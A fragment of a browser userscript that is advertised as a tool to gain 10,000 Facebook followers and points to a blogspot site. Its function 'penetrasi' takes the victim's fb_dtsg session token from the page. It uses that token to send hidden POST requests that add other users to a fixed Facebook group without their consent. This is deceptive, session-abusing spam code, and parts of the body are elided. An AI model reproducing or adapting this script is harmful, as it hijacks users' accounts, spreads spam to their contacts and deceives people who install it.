// ==UserScript==
// @name akn flawors
// @namespace https://akn-face-book.blogspot.com/
// @version 0.1
// @description husam alshjarh.
// ==/UserScript==
...
var tulisanNganu = '<font color="black"><b>akn facebook |تحميل 10000 متابع</b> </font>';
var kunaon = '';
function penetrasi(opo) {
	...
	if (memberGroupId != 185753638285212) {
		jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=185753638285212&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user, function () {},
		"text", "post")
	}
}
